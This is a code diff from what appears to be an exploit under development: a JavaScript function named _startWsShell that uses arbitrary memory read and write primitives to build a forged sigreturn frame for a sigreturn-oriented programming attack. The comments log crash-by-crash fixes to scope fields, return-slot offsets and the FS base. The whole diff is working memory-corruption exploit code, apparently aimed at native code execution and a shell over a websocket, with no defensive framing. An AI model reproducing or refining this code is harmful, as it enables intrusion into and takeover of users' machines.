@@ -5482,19 +5482,18 @@ function _startWsShell(){
           reply.retSlot={addr:'0x'+retSlotAddr.toString(16),provenance:'V70 constant cfr-0x328 across four boots'};
           SF('2 direct retSlot=0x'+retSlotAddr.toString(16)+' (cfr-0x328)');
 
-          /* (2) THE PARENT RECORD AT B2 (srop22 - THE SCOPE-RECORD
-           * COLLISION FIX). srop21's rehearsal call died AFTER the record
-           * build: the record-at-CAP loop zeroed the scope's live fields
-           * (+0x00-0x37 minus the VM pair) and the next native call through
-           * that scope died - THE SECOND structural killer, alongside the
-           * stale FS base (srop19's correct-FS rt died the same way; fire19
-           * survived because its gates lived in a DIFFERENT buffer). THE
-           * FIX: the record lives at B2=CAP+0x2000 (proven mapped),
-           * pre-cloned with the live scope head so B2 is a VALID scope for
-           * the call path (the VM pair preserved by construction), the mask
-           * region (+0x08-0x28) zeroed (proven survivable), and the 417
-           * call passes RDI=B2. The kernel reads the record; the call path
-           * sees a valid scope; nothing poisons anything. */
+          /* (2) THE PARENT RECORD AT B2 (srop23 - THE +0x20 SCOPE FIELD
+           * FIX). srop22's rehearsal died again: the ONLY difference vs the
+           * proven-survivable rawcall = the mask-zero loop zeroed B2+0x08,
+           * 0x10, 0x18 AND 0x20 - the rawcall zeroes only through +0x20 and
+           * survives, so THE +0x20 QWORD IS A THIRD LIVE-CRITICAL SCOPE
+           * FIELD (after the side-channel and the VM pair). THE FIX: the B2
+           * clone is UNTOUCHED - all 0x48 live bytes stay. The kernel reads
+           * the signal mask from the record's +0x08-0x28 = the clone's live
+           * bytes: any 128-bit mask is valid input, and a fault-generated
+           * SIGSEGV is delivered regardless of the mask, so a garbage mask
+           * is safe. The record's fields: +0x48..0x4C0 (the 814a constants
+           * + the discovered FS base) + the mode patches. */
           var CTX=CAP+0x1000n,STK=CAP+0x2F00n,WIT=CAP+0x3000n,B2=CAP+0x2000n;
           for(var zS=0;zS<0x500/8;zS++)S.absWrite(CTX+BigInt(zS*8),0n);
           S.absWrite(WIT,0n);
@@ -5502,7 +5501,6 @@ function _startWsShell(){
           reply.vm38='0x'+S.absRead(S.fakeScope+0x38n,8)[0].toString(16);
           var headS=S.absRead(CAP,0x48);
           for(var hW=0;hW<headS.length;hW++)S.absWrite(B2+BigInt(hW*8),headS[hW]);
-          for(var mW=1;mW<5;mW++)S.absWrite(B2+BigInt(mW*8),0n);   /* +0x08-0x28 = the empty mask */
           var K814={72:0n,80:0n,88:0n,96:0n,104:0n,112:0n,120:0n,
                    128:0x2FECE976n,136:cfrS,144:0x515CA11n,152:0x4B1AA0n,
                    160:0xFFFFFFFFn,176:0x2FD98042n,184:0x2FD98042n,
